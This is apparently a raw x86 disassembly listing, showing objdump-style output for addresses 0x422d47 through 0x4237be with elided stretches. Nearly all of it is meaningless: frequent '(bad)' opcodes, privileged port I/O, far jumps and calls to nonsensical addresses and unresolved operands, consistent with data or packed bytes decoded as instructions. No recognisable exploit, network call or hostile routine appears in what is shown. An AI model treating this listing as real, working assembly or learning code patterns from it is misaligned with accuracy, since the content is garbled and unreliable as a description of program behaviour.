  422d47:	push   es
  422d48:	inc    ecx
  422d49:	leave  
  422d4a:	pop    es
  422d4b:	imul   eax,DWORD PTR ds:0xf8a13ba4,0x55
  422d52:	(bad)  
  422d54:	add    ebx,DWORD PTR [ebx-0x31]
  422d57:	ret    
  422d58:	add    eax,0x1af73e23
  422d5d:	outs   dx,BYTE PTR ds:[esi]
  422d5e:	rcl    DWORD PTR [ebp+0x266772c7],1
  422d64:	pop    ebx
  422d65:	pop    edi
  422d66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d67:	xor    al,dl
  422d69:	xor    DWORD PTR [eax+0x31],ebx
  422d6c:	cli    
  422d6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d6e:	jmp    0x422cf3
  422d70:	mov    al,0x63
  422d72:	(bad)  
  422d73:	mov    eax,ds:0x51d114bd
  422d78:	lahf   
  422d79:	mov    WORD PTR [ebp-0x4a0e1907],?
  422d7f:	adc    edi,DWORD PTR [edi]
  422d81:	inc    esi
  422d82:	ja     0x422d51
  422d84:	mov    DWORD PTR [esi],0x1a8cf400
  422d8a:	pop    ecx
  422d8b:	xchg   esi,eax
  422d8c:	push   ds
  422d8d:	clc    
  422d8e:	jne    0x422dab
  422d90:	xchg   edx,eax
  422d91:	out    0xf,eax
  422d93:	ficom  WORD PTR [ebx-0x23]
  422d96:	je     0x422dae
  422d98:	rol    DWORD PTR [esi-0x3bd15f01],cl
  422d9e:	loop   0x422dca
  422da0:	push   esp
  422da1:	mov    eax,0x5a62fd4e
  422da6:	imul   edx,ebp,0xe74fa9e7
  422dac:	js     0x422dd0
  422dae:	ins    DWORD PTR es:[edi],dx
  422daf:	test   al,0xd
  422db1:	ins    DWORD PTR es:[edi],dx
  422db2:	popf   
  422db3:	or     BYTE PTR [esi+ecx*2],ch
  422db6:	in     eax,dx
  422db7:	ja     0x422d8d
  422db9:	in     eax,0x27
  422dbb:	int3   
  422dbc:	push   esp
  422dbd:	or     eax,0x6fe838d0
  422dc2:	push   edx
  422dc3:	in     al,0x8a
  422dc5:	push   es
  422dc6:	sub    ch,bl
  422dc8:	mov    dh,0x89
  422dca:	cmp    al,0xb8
  422dcc:	mov    bl,0xa6
  422dce:	mov    ds:0xd1a7c786,eax
  422dd3:	popa   
  422dd4:	retf   0xa322
  422dd7:	(bad)  
  422dd8:	jmp    0x422de4
  422dda:	sub    BYTE PTR [eax-0x5769c156],dh
  422de0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422de1:	pop    es
  422de2:	mov    bh,0x8a
  422de4:	inc    si
  422de6:	daa    
  422de7:	shl    DWORD PTR [ecx+0x20],1
  422dea:	or     DWORD PTR [ecx+0x3e],esi
  422ded:	and    ebx,edi
  422def:	sbb    DWORD PTR [ebx],esp
  422df1:	sbb    bh,BYTE PTR ds:0x51fd23a6
  422df7:	cmp    al,0x9a
  422dfa:	fcom   DWORD PTR [esi+0x6]
  422dfd:	xor    al,0x67
  422dff:	pop    edi
  422e00:	das    
  422e01:	ds mov dl,0xa1
  422e04:	(bad)  
  422e05:	cmp    DWORD PTR [ebx],ebp
  422e07:	mov    eax,ds:0x2a5136b7
  422e0c:	xor    dh,0xdc
  422e0f:	fmul   QWORD PTR [edi]
  422e11:	mov    esp,0xa2ba1a9b
  422e16:	(bad)  
  422e17:	pop    esi
  422e18:	push   ebp
  422e19:	fild   WORD PTR [esi+0x11]
  422e1c:	shl    al,1
  422e1e:	xchg   ecx,eax
  422e1f:	popa   
  422e20:	popa   
  422e21:	retf   0x643c
  422e24:	ds xor eax,0xf019d81b
  422e2a:	fmul   DWORD PTR [eax]
  422e2c:	sub    al,0x65
  422e2e:	mov    dl,0x60
  422e30:	push   ecx
  422e31:	fs mov ebx,0x709e
	...
  422e93:	add    BYTE PTR [eax],al
  422e95:	add    BYTE PTR [ebx-0x21e677ab],al
  422e9b:	fst    QWORD PTR [ebx+0x2a9187df]
  422ea1:	mov    ebx,0xc9e64df2
  422ea6:	dec    ebp
  422ea7:	jae    0x422eaa
  422ea9:	add    BYTE PTR [edi],al
  422eab:	add    DWORD PTR [eax],eax
  422ead:	add    BYTE PTR [edi-0x29],ch
  422eb0:	cmp    ebp,DWORD PTR [ecx-0x57]
  422eb3:	retf   
  422eb4:	adc    ch,ch
  422eb6:	(bad)
  422ebc:	fld    DWORD PTR [ebx+ecx*8+0x2a38d4c1]
  422ec3:	lahf   
  422ec4:	in     al,dx
  422ec5:	mov    edi,0xe6a0ce0b
  422eca:	imul   edi,DWORD PTR [esi+0xcbf08c0],0x99cd8b39
  422ed4:	sub    DWORD PTR [edx-0x23bfd25b],ebp
  422eda:	mov    al,ds:0x94156be5
  422edf:	fld    DWORD PTR [edx]
  422ee1:	pop    esi
  422ee2:	adc    dh,BYTE PTR [edi]
  422ee4:	cwde   
  422ee5:	add    al,0x2
  422ee7:	lahf   
  422ee8:	addr16 pop es
  422eea:	rcr    BYTE PTR [ecx-0x7e],0x99
  422eee:	mov    bl,al
  422ef0:	dec    esp
  422ef1:	push   eax
  422ef2:	add    al,0x6c
  422ef4:	aam    0x7e
  422ef6:	jge    0x422f06
  422ef8:	out    dx,al
  422ef9:	or     ch,BYTE PTR [edi+0x2dfb4e5a]
  422eff:	(bad)  
  422f01:	shr    BYTE PTR [ebp+0x67db41e8],1
  422f07:	jbe    0x422f72
  422f09:	sti    
  422f0a:	aaa    
  422f0b:	call   0x246b77c1
  422f10:	pop    ebx
  422f11:	sbb    eax,0x68973d9f
  422f16:	dec    esi
  422f17:	inc    esp
  422f18:	mov    cl,0x95
  422f1a:	sub    ebx,ecx
  422f1c:	inc    esi
  422f1d:	shl    DWORD PTR [eax+0x6fc31f29],0x78
  422f24:	jnp    0x422eea
  422f26:	jmp    0x4a6:0xe99a5233
  422f2d:	inc    eax
  422f2e:	add    edi,DWORD PTR [edx]
  422f30:	inc    edx
  422f31:	hlt    
  422f32:	addr16 test eax,0xf573d64d
  422f38:	call   0xfd5a:0x6561c40b
  422f3f:	fimul  DWORD PTR [edi-0x54]
  422f42:	je     0x422fbf
  422f44:	fcom   DWORD PTR [ebx]
  422f46:	sahf   
  422f47:	sbb    eax,0x39ed28e4
  422f4c:	dec    ecx
  422f4d:	sbb    BYTE PTR [ebp+0x10],0xc4
  422f51:	inc    ebp
  422f52:	sub    DWORD PTR [ebx],ecx
  422f54:	fisubr WORD PTR [ebp+0x60c384b8]
  422f5a:	in     al,0xcf
  422f5c:	loopne 0x422f9b
  422f5e:	lds    edx,FWORD PTR [edx+0x5d]
  422f61:	xchg   BYTE PTR ds:0x192f7af0,bl
  422f67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f68:	int3   
  422f69:	sub    cl,BYTE PTR [ecx+0x37]
  422f6c:	push   ecx
  422f6d:	clc    
  422f6e:	std    
  422f6f:	jo     0x422f34
  422f71:	addr16 jmp 0x422fe0
  422f74:	das    
  422f75:	mov    al,ds:0x7d975042
  422f7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f7b:	out    0x8,al
  422f7d:	call   0x51430d9b
  422f82:	pop    ebx
  422f83:	leave  
  422f84:	addr16 sbb edi,edi
  422f87:	imul   ebp,DWORD PTR [esi+0x4751bf7a],0x6ab1e83b
  422f91:	add    ebx,DWORD PTR gs:[ecx]
  422f94:	cdq    
  422f95:	push   cs
  422f96:	hlt    
  422f97:	out    0x24,al
  422f99:	dec    esi
  422f9a:	test   al,0xae
  422f9c:	mov    bl,0xfc
  422f9e:	es bnd jne 0x422f5f
  422fa2:	test   BYTE PTR [edi],dh
  422fa4:	add    eax,0xdea6f4de
  422fa9:	or     al,0xb6
  422fab:	clc    
  422fac:	or     ch,bh
  422fae:	sub    al,0xf
  422fb0:	arpl   WORD PTR [eax+0x4d7522],cx
	...
  423016:	inc    esi
  423017:	in     al,0x62
  423019:	mov    dl,ah
  42301b:	mov    gs,esi
  42301d:	out    dx,al
  42301e:	lahf   
  42301f:	aaa    
  423020:	inc    ebp
  423021:	or     DWORD PTR [edx],ebp
  423023:	push   cs
  423024:	loop   0x423003
  423026:	push   esp
  423027:	je     0x42302a
  423029:	add    BYTE PTR [edi],al
  42302b:	add    DWORD PTR [eax],eax
  42302d:	add    BYTE PTR [ecx+0x473f07b0],al
  423033:	mov    esp,0x86e1c14e
  423038:	xor    dl,BYTE PTR [edi+eax*2+0x41]
  42303c:	mov    edi,0xd7a32036
  423041:	mov    ebp,0x4ef43aa6
  423046:	add    BYTE PTR ds:0x50f703ea,dh
  42304c:	inc    edx
  42304d:	push   ebx
  42304e:	ja     0x42301b
  423050:	inc    edi
  423051:	xlat   BYTE PTR ds:[ebx]
  423052:	pop    ebx
  423053:	pop    DWORD PTR [ebx-0x11]
  423056:	inc    edi
  423057:	addr16 jg 0x4230b9
  42305a:	stc    
  42305b:	push   es
  42305c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42305d:	adc    BYTE PTR [edx+edi*1],0x27
  423061:	mov    al,0xe6
  423063:	pop    edx
  423064:	cmp    BYTE PTR [ecx-0x55],cl
  423067:	arpl   WORD PTR [ecx],dx
  423069:	mov    edx,0x30b5e11d
  42306e:	imul   edx,DWORD PTR [edi],0x2
  423071:	push   eax
  423072:	add    bl,ah
  423074:	inc    edi
  423075:	lock in eax,dx
  423077:	and    al,0xb7
  423079:	inc    eax
  42307a:	push   edx
  42307b:	dec    eax
  42307c:	jmp    0x5c90:0xee0566c4
  423083:	and    al,dl
  423085:	aaa    
  423086:	sbb    DWORD PTR [eax+0x6fc9931e],esp
  42308c:	scas   al,BYTE PTR es:[edi]
  42308d:	push   esp
  42308e:	iret   
  42308f:	outs   dx,BYTE PTR ds:[esi]
  423090:	fsub   DWORD PTR [edx]
  423092:	sar    dl,0x53
  423095:	mov    bl,0x23
  423097:	sbb    esp,esi
  423099:	rep outs dx,DWORD PTR ds:[esi]
  42309b:	hlt    
  42309c:	mov    ecx,0xb543e85
  4230a1:	test   DWORD PTR ds:0x733f7aa3,ebx
  4230a7:	inc    ebp
  4230a8:	xlat   BYTE PTR ds:[ebx]
  4230a9:	mov    DWORD PTR [edx],edx
  4230ab:	dec    eax
  4230ac:	mov    ds,ecx
  4230ae:	out    0x11,al
  4230b0:	dec    ebx
  4230b1:	and    eax,esi
  4230b3:	stos   DWORD PTR es:[edi],eax
  4230b4:	pop    ss
  4230b5:	and    ch,BYTE PTR [esi]
  4230b7:	(bad)  [edx+0x61]
  4230ba:	xor    al,0x83
  4230bc:	in     eax,0x45
  4230be:	scas   al,BYTE PTR es:[edi]
  4230bf:	add    ecx,edi
  4230c1:	loopne 0x4230f6
  4230c3:	lods   eax,DWORD PTR ds:[esi]
  4230c4:	sub    al,0xb4
  4230c6:	(bad)  
  4230c8:	sbb    dl,BYTE PTR [ebp-0xdc7afc6]
  4230ce:	shr    BYTE PTR [ebx-0x26f297d7],1
  4230d4:	repz mov ds:0xfe0bdfb0,al
  4230da:	jae    0x4230ba
  4230dc:	stos   BYTE PTR es:[edi],al
  4230dd:	cs inc ecx
  4230df:	adc    DWORD PTR [edi+0x79d53e2b],esp
  4230e5:	xchg   BYTE PTR ds:[esi],ah
  4230e8:	out    0x87,al
  4230ea:	xor    al,0xa4
  4230ec:	pop    ds
  4230ed:	int    0x55
  4230ef:	test   BYTE PTR [edi-0xf],0x1c
  4230f3:	shr    esp,1
  4230f5:	mov    WORD PTR [ebp+0x0],?
  4230f8:	inc    edx
  4230f9:	int    0xf7
  4230fb:	mov    ecx,DWORD PTR ss:[edx-0x41]
  4230ff:	push   ecx
  423100:	or     eax,0xcf2f39ae
  423105:	add    BYTE PTR [ebp-0x7f],ch
  423108:	push   esp
  423109:	cmp    esi,ebp
  42310b:	adc    bl,BYTE PTR [edi+0x53]
  42310e:	adc    eax,0x795e2aa5
  423113:	mov    WORD PTR [ebx+0x607013e8],ds
  423119:	cmp    edx,DWORD PTR [eax]
  42311b:	push   eax
  42311c:	dec    esi
  42311d:	aad    0x30
  42311f:	mov    ds:0x4b97569c,eax
  423124:	or     ecx,esp
  423126:	pop    esp
  423127:	cld    
  423128:	xor    BYTE PTR [ebx+0x21],bh
  42312b:	adc    al,0x7b
  42312d:	mov    WORD PTR [edi-0x26d4f2f9],cs
  423133:	inc    ecx
  423134:	pop    ecx
	...
  423195:	add    BYTE PTR [ecx-0xf],bh
  423198:	div    DWORD PTR [ecx-0x6804801]
  42319e:	dec    edi
  42319f:	jno    0x423168
  4231a1:	or     BYTE PTR [edi-0x54],0x2e
  4231a5:	ja     0x423202
  4231a7:	jne    0x4231aa
  4231a9:	add    BYTE PTR [edi],al
  4231ab:	add    DWORD PTR [eax],eax
  4231ad:	add    BYTE PTR [edi],bh
  4231af:	pop    edx
  4231b0:	enter  0x1f8e,0xf3
  4231b4:	push   ss
  4231b5:	shl    BYTE PTR ds:0xd43f6042,0x18
  4231bc:	push   esi
  4231bd:	ins    DWORD PTR es:[edi],dx
  4231be:	outs   dx,BYTE PTR ds:[esi]
  4231bf:	not    DWORD PTR [eax-0x1e]
  4231c2:	hlt    
  4231c3:	sar    BYTE PTR [eax],0x1c
  4231c6:	dec    edi
  4231c7:	push   eax
  4231c8:	out    0x56,eax
  4231ca:	outs   dx,DWORD PTR ds:[esi]
  4231cb:	sub    DWORD PTR [edi-0x1e1cf102],0x3c
  4231d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4231d3:	push   esp
  4231d4:	ror    BYTE PTR [esi],1
  4231d6:	and    esp,DWORD PTR [ecx]
  4231d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4231d9:	push   ebp
  4231da:	shl    DWORD PTR [ecx*4-0x1e335db3],1
  4231e1:	push   esi
  4231e2:	mov    al,ds:0x372e66a1
  4231e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4231e8:	(bad)  
  4231e9:	mov    esp,0xa3dff1cb
  4231ee:	mov    esp,0x69dfce10
  4231f3:	aaa    
  4231f4:	mov    al,dl
  4231f6:	jmp    0xcb457da9
  4231fb:	push   0x11d05405
  423200:	xchg   esp,eax
  423201:	mov    cs,WORD PTR [esi]
  423203:	mov    esi,DWORD PTR [ebx+ebx*4+0x4b]
  423207:	ds inc ecx
  423209:	cmp    edx,DWORD PTR [ebp+0x4689bc25]
  42320f:	dec    eax
  423210:	mov    es,WORD PTR ds:0xbf9eb4d4
  423216:	aam    0xa4
  423218:	or     ecx,edi
  42321a:	sbb    DWORD PTR [edi],0xbb9eeb59
  423220:	pop    eax
  423221:	ja     0x423270
  423223:	fnstcw WORD PTR [ebx+0x7f]
  423226:	jo     0x42325f
  423228:	xchg   edi,eax
  423229:	jge    0x4231e7
  42322b:	je     0x4231f1
  42322d:	mov    edx,edi
  42322f:	sahf   
  423230:	loop   0x4232a2
  423232:	daa    
  423233:	jg     0x423206
  423235:	adc    al,0x5d
  423237:	call   0xe97c6999
  42323c:	fwait
  42323d:	push   esi
  42323e:	lds    esi,FWORD PTR [edi+0x5e]
  423241:	shl    BYTE PTR [ebx],cl
  423243:	mov    cs,WORD PTR [ebx+0x55]
  423246:	and    eax,0x9bc3b4e1
  42324b:	lahf   
  42324c:	xchg   ebx,eax
  42324d:	nop
  42324e:	or     esi,ecx
  423250:	sub    edx,DWORD PTR [edx+edx*2]
  423253:	sub    ebx,DWORD PTR [edi]
  423255:	add    ebx,DWORD PTR [eiz*2-0x27355409]
  42325c:	outs   dx,BYTE PTR ds:[esi]
  42325d:	mov    dl,0x89
  42325f:	sub    al,0x25
  423261:	push   esp
  423262:	jge    0x42320f
  423264:	xor    BYTE PTR [esi+0x3c],0xf3
  423268:	ja     0x42326d
  42326a:	popa   
  42326b:	sbb    eax,0x8bde032b
  423270:	push   0x13038d
  423275:	iret   
  423276:	inc    ebx
  423277:	xor    BYTE PTR [ebx],bh
  423279:	push   esi
  42327a:	and    BYTE PTR [eax+0x3b],0x25
  42327e:	jmp    0xe562e974
  423283:	(bad)  
  423284:	fcomp  DWORD PTR [ebx]
  423286:	gs jle 0x423257
  423289:	or     edx,DWORD PTR [edi+ecx*4-0x7219e9c1]
  423290:	and    esp,DWORD PTR [eax]
  423292:	xchg   ebp,eax
  423293:	xchg   ebx,eax
  423294:	sbb    DWORD PTR [ebx+ebp*8-0x1a],ebp
  423298:	push   esp
  423299:	ret    
  42329a:	data16 fdiv st(2),st
  42329d:	ins    BYTE PTR es:[di],dx
  42329f:	cdq    
  4232a0:	rcr    BYTE PTR [ebx+ecx*8+0x2d],cl
  4232a4:	test   eax,0xeaa46a2b
  4232a9:	sub    BYTE PTR [ecx+0x21ec2fb9],cl
  4232af:	adc    edx,0xffffffcc
  4232b2:	add    dl,bl
  4232b4:	inc    ebp
	...
  423315:	add    al,bh
  423317:	fisub  WORD PTR [edx+0x30]
  42331a:	mov    sp,0xdefa
  42331e:	xchg   edi,eax
  42331f:	inc    esp
  423320:	lock (bad) 
  423322:	call   0x176:0x62f81c0a
  423329:	add    BYTE PTR [edi],al
  42332b:	add    DWORD PTR [eax],eax
  42332d:	add    BYTE PTR ds:0x59dca863,bl
  423333:	pop    esp
  423334:	mov    ah,dh
  423336:	cli    
  423337:	inc    eax
  423338:	lods   eax,DWORD PTR ds:[esi]
  423339:	ja     0x423357
  42333b:	mov    eax,ds:0xfd247393
  423340:	mov    ah,0x2a
  423342:	fcom   QWORD PTR [ebx+esi*8-0x457c7693]
  423349:	adc    ebx,DWORD PTR [ecx+0x7a9690e3]
  42334f:	ret    
  423350:	pop    esi
  423351:	push   ecx
  423352:	sub    eax,0xc275066d
  423357:	pop    es
  423358:	mov    ebp,0x6c3fc62e
  42335d:	push   eax
  42335e:	jp     0x4232ea
  423360:	adc    al,0xdf
  423362:	int    0x62
  423364:	(bad)  
  423365:	scas   al,BYTE PTR es:[edi]
  423366:	fs cmp al,0x8d
  423369:	and    DWORD PTR [eax],esp
  42336b:	and    esi,edx
  42336d:	fcmovu st,st(4)
  42336f:	ja     0x42334c
  423371:	and    dh,BYTE PTR [esi+0x19f50c4b]
  423377:	pop    ebx
  423378:	or     dl,BYTE PTR [eax]
  42337a:	jmp    0xc07c75d3
  42337f:	pop    es
  423380:	jecxz  0x4233b2
  423382:	aam    0xeb
  423384:	xlat   BYTE PTR ds:[ebx]
  423385:	repz fdivr DWORD PTR [ecx+0x5be1b029]
  42338c:	xchg   edx,eax
  42338d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42338e:	mov    ebx,0x96be819e
  423393:	and    bl,BYTE PTR [esi-0x65]
  423396:	push   edx
  423397:	cs pop esi
  423399:	rol    DWORD PTR [ebx-0xe518311],1
  42339f:	sbb    BYTE PTR [ebx],ah
  4233a1:	mov    al,0x85
  4233a3:	test   edx,eax
  4233a5:	cld    
  4233a6:	inc    ebx
  4233a7:	add    al,0xaa
  4233a9:	pop    edx
  4233aa:	paddw  mm6,QWORD PTR [esi*2-0x10121fa7]
  4233b2:	int    0xcd
  4233b4:	inc    edi
  4233b5:	std    
  4233b6:	lock fs sub al,0x6f
  4233ba:	std    
  4233bb:	mov    eax,0xb7a98b8b
  4233c0:	ja     0x423433
  4233c2:	not    DWORD PTR [edi+0xc29f958]
  4233c8:	shr    DWORD PTR [edx+edi*2],cl
  4233cb:	es push 0x9da47889
  4233d1:	mov    al,ds:0x5eb3e46a
  4233d6:	jmp    0x423412
  4233d8:	test   DWORD PTR [edi-0x74],0xc3ca0ff2
  4233df:	je     0x4233d9
  4233e1:	pop    edx
  4233e2:	dec    esi
  4233e3:	in     eax,dx
  4233e4:	loope  0x423464
  4233e6:	adc    eax,0x713b46f1
  4233eb:	lds    edi,FWORD PTR [ebx+0x553d614]
  4233f1:	add    DWORD PTR [esi-0x78],esi
  4233f4:	mov    bh,0x88
  4233f6:	and    DWORD PTR [esi+0x50c93fbc],0x6a
  4233fd:	(bad)
  423401:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423402:	test   DWORD PTR [esi+0x2d82941],0x98e36771
  42340c:	inc    esp
  42340d:	push   esp
  42340e:	pop    edx
  42340f:	imul   eax,DWORD PTR [edx-0x36],0xfffffff3
  423413:	mov    edi,0x83ef7323
  423418:	sbb    dl,BYTE PTR [edx+edi*2]
  42341b:	push   esp
  42341c:	enter  0x5824,0xc6
  423420:	jge    0x4233d8
  423422:	mov    BYTE PTR [esp+edi*1],0xe8
  423426:	push   ebp
  423427:	inc    ebx
  423428:	push   ebp
  423429:	jb     0x42348f
  42342b:	fidiv  WORD PTR [ebp+0x2e]
  42342e:	repnz ins BYTE PTR es:[edi],dx
  423430:	dec    eax
  423431:	mov    edx,0xa404f4
	...
  423496:	shl    BYTE PTR [eax-0x8a90bb],0xea
  42349d:	mov    edi,0xe016fb60
  4234a2:	cmp    eax,0x697553f8
  4234a7:	ja     0x4234aa
  4234a9:	add    BYTE PTR [edi],al
  4234ab:	add    DWORD PTR [eax],eax
  4234ad:	add    ah,bl
  4234af:	lock out 0xcb,eax
  4234b2:	sbb    DWORD PTR [eax-0x78bf98de],eax
  4234b8:	sub    BYTE PTR ds:0xc94fb2e1,ah
  4234be:	out    dx,al
  4234bf:	into   
  4234c0:	pop    ss
  4234c1:	ficomp WORD PTR ds:0xdf6a3e13
  4234c7:	mov    DWORD PTR [edi],esi
  4234c9:	sahf   
  4234ca:	sbb    edx,edi
  4234cc:	fisttp WORD PTR [eax]
  4234ce:	cmp    al,al
  4234d0:	ret    0x4174
  4234d3:	in     al,0x70
  4234d5:	sar    DWORD PTR [edx-0x37],1
  4234d8:	add    edx,DWORD PTR [esp+ebx*2-0x5eda36a5]
  4234df:	div    esi
  4234e1:	jmp    0x42348c
  4234e3:	mov    al,ds:0x6d6c40c7
  4234e8:	jo     0x4234d8
  4234ea:	or     BYTE PTR [edi-0x65],dh
  4234ed:	xor    al,0xf4
  4234ef:	add    cl,bl
  4234f1:	test   al,0x3f
  4234f3:	jl     0x4234e3
  4234f5:	mov    dh,0xec
  4234f7:	mov    al,0x39
  4234f9:	or     BYTE PTR [edi+eax*8-0x1019a183],bh
  423500:	sbb    esi,DWORD PTR [ebp+0x543cbbe1]
  423506:	ins    DWORD PTR es:[edi],dx
  423507:	mov    bh,0xe1
  423509:	adc    BYTE PTR [edi],0x5
  42350c:	sti    
  42350d:	and    al,0x90
  42350f:	pop    ecx
  423510:	inc    ebp
  423511:	cld    
  423512:	test   al,0xe9
  423514:	add    DWORD PTR [edi],ebp
  423516:	pop    edi
  423517:	cmp    eax,0x966f2410
  42351c:	std    
  42351d:	out    0x20,al
  42351f:	mov    BYTE PTR [ecx+0x107f6cd9],0xfc
  423526:	xchg   BYTE PTR [esi-0x41],al
  423529:	data16 jg 0x4234dc
  42352c:	call   0xdced247d
  423531:	mov    bh,0x2b
  423533:	inc    ecx
  423534:	inc    edx
  423536:	lock sub BYTE PTR [esi+eax*8+0x29f75db4],dh
  42353e:	inc    ebp
  42353f:	xchg   edi,eax
  423540:	sbb    BYTE PTR [ebx-0x3c],0xc5
  423544:	fwait
  423545:	or     dh,BYTE PTR [edx+esi*1+0x48d10078]
  42354c:	pop    eax
  42354d:	pop    ebx
  42354e:	dec    ebx
  42354f:	xchg   ebp,eax
  423550:	shl    DWORD PTR [esi+ebx*1+0x4e],1
  423554:	pop    edi
  423555:	mov    edi,0x7796b7a3
  42355a:	cli    
  42355b:	xchg   edi,eax
  42355c:	rol    BYTE PTR [ecx+0x65cd9e9c],0x86
  423563:	mov    esp,0x7fdcb32d
  423568:	not    BYTE PTR [esi]
  42356a:	add    BYTE PTR [ebx-0x41],ah
  42356d:	xchg   esi,eax
  42356e:	int    0x29
  423570:	lods   al,BYTE PTR ds:[esi]
  423571:	fdivr  st(7),st
  423573:	retf   
  423574:	mov    al,ds:0x693b0068
  423579:	xor    esp,DWORD PTR [eax-0x20]
  42357c:	call   DWORD PTR [ebp+0x53dff3b5]
  423582:	jg     0x42354c
  423584:	dec    ebx
  423585:	out    0x6f,eax
  423587:	cmp    DWORD PTR [ecx],ebx
  423589:	xor    eax,0xf1d7be51
  42358e:	icebp  
  42358f:	mov    al,0x8a
  423591:	xchg   esi,eax
  423592:	(bad)  
  423594:	call   0xd250b1f1
  423599:	adc    edi,edx
  42359b:	shr    DWORD PTR [ebx+eiz*8-0x233446df],cl
  4235a2:	add    DWORD PTR [eax],esi
  4235a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235a5:	lods   eax,DWORD PTR ds:[esi]
  4235a6:	push   eax
  4235a7:	stos   DWORD PTR es:[edi],eax
  4235a8:	loope  0x4235c7
  4235aa:	mov    ch,0x88
  4235ac:	xchg   esi,eax
  4235ad:	fistp  DWORD PTR [ebx*8-0x1f2d1b6b]
  4235b4:	cmp    eax,DWORD PTR [eax]
	...
  423616:	or     BYTE PTR [edi-0x8808b84],0x88
  42361d:	dec    DWORD PTR [eax+0x2d]
  423620:	push   0xffffffda
  423622:	sbb    al,0xb9
  423624:	jmp    0x700:0x1787030
  42362b:	add    DWORD PTR [eax],eax
  42362d:	add    BYTE PTR [ebx],ah
  42362f:	cmp    eax,0xe48dd303
  423634:	pushf  
  423635:	icebp  
  423636:	outs   dx,DWORD PTR ds:[esi]
  423637:	std    
  423638:	nop
  423639:	xchg   edi,eax
  42363a:	loope  0x4235eb
  42363c:	(bad)  
  42363d:	xchg   edi,eax
  42363e:	jmp    0xb0a7:0x505cd1f5
  423645:	loopne 0x423689
  423647:	addr16 mov cl,0x75
  42364a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42364b:	sbb    eax,0x98ca92dc
  423650:	std    
  423651:	jmp    0x18b2:0xccac814f
  423658:	dec    edi
  423659:	cmp    bl,ch
  42365b:	ret    0xbf93
  42365e:	je     0x423674
  423660:	xor    esi,eax
  423662:	adc    eax,0x2472b961
  423667:	popf   
  423668:	xchg   esp,eax
  423669:	jmp    0xbc96c3a
  42366e:	mov    ?,WORD PTR ds:0x845f3933
  423674:	xor    bh,BYTE PTR [ebx]
  423676:	jmp    0x9893071e
  42367b:	push   edi
  42367c:	adc    DWORD PTR [ebx],edi
  42367e:	inc    ebx
  42367f:	clc    
  423680:	sahf   
  423681:	cmc    
  423682:	jne    0x4236e0
  423684:	test   al,0x69
  423686:	push   0x5e54c215
  42368b:	dec    edi
  42368c:	and    ch,0xe9
  42368f:	mov    BYTE PTR [edx],ah
  423691:	enter  0x7fd9,0x3c
  423695:	mov    ebx,0x4437f71e
  42369a:	out    dx,eax
  42369b:	inc    BYTE PTR [ebp-0x32ce83ce]
  4236a1:	push   ss
  4236a2:	shr    BYTE PTR [edi+0x3e],0xdd
  4236a6:	inc    esp
  4236a7:	dec    esi
  4236a8:	add    dl,BYTE PTR [ecx]
  4236aa:	ss int3 
  4236ac:	jae    0x423665
  4236ae:	popa   
  4236af:	sbb    ch,BYTE PTR [edi-0x6a]
  4236b2:	ins    DWORD PTR es:[edi],dx
  4236b3:	pop    esp
  4236b4:	jnp    0x42370c
  4236b6:	inc    esp
  4236b7:	(bad)  
  4236b8:	push   esi
  4236b9:	push   ebp
  4236ba:	lahf   
  4236bb:	int    0x59
  4236bd:	push   cs
  4236be:	and    eax,0x80c6b05a
  4236c3:	fcmovbe st,st(6)
  4236c5:	and    BYTE PTR ds:0x86b4b617,0x81
  4236cc:	retf   0x59db
  4236cf:	out    dx,eax
  4236d0:	cdq    
  4236d1:	ret    0xcc1e
  4236d4:	(bad)  
  4236d5:	jp     0x42368b
  4236d7:	cmp    DWORD PTR [ebp+0x5c],eax
  4236da:	loop   0x4236fc
  4236dc:	mov    cl,0x46
  4236de:	lea    edi,[ecx-0x22]
  4236e1:	rol    BYTE PTR [ecx-0x233f04d9],cl
  4236e7:	cwde   
  4236e8:	sar    ch,0xd1
  4236eb:	sbb    BYTE PTR [esi],bl
  4236ed:	lods   al,BYTE PTR ds:[esi]
  4236ee:	pop    es
  4236ef:	(bad)  
  4236f0:	and    al,0x83
  4236f2:	jle    0x423754
  4236f4:	inc    esp
  4236f5:	mov    edi,0x7b280295
  4236fa:	fimul  DWORD PTR [ebx-0x4a13fb30]
  423700:	int3   
  423701:	shr    DWORD PTR [edx+0x4e388775],0xe2
  423708:	and    bh,al
  42370a:	stc    
  42370b:	xchg   edi,eax
  42370c:	and    edx,ebp
  42370e:	mov    edx,gs
  423710:	cmc    
  423711:	push   ebx
  423712:	hlt    
  423713:	ror    DWORD PTR [ebx],0x8e
  423716:	add    edi,DWORD PTR [ecx+ebx*2]
  423719:	dec    ebp
  42371a:	pop    ss
  42371b:	or     al,0x4b
  42371d:	dec    ebp
  42371e:	add    BYTE PTR [eax],bh
  423720:	cmp    eax,0xc09fc61f
  423725:	jno    0x4236cb
  423727:	hlt    
  423728:	push   esp
  423729:	fcmovu st,st(1)
  42372b:	xor    esp,DWORD PTR [edx]
  42372d:	call   FWORD PTR [eax-0x6af9d3]
  423733:	jg     0x4236ce
	...
  423795:	add    BYTE PTR [ebx+eiz*1],dh
  423798:	jo     0x423737
  42379a:	ja     0x42377b
  42379c:	std    
  42379d:	stos   DWORD PTR es:[edi],eax
  42379e:	inc    edx
  42379f:	push   ebx
  4237a0:	cli    
  4237a1:	test   eax,0xb84f82
  4237a6:	ja     0x423821
  4237a8:	add    DWORD PTR [eax],eax
  4237aa:	pop    es
  4237ab:	add    DWORD PTR [eax],eax
  4237ad:	add    cl,ch
  4237af:	dec    ebp
  4237b0:	gs sti 
  4237b2:	pop    esi
  4237b3:	add    ah,cl
  4237b5:	push   ds
  4237b6:	out    dx,al
  4237b7:	mov    WORD PTR [edx],?
  4237b9:	enter  0xa512,0x4a
  4237bd:	scas   al,BYTE PTR es:[edi]
  4237be:	or     al,0x73
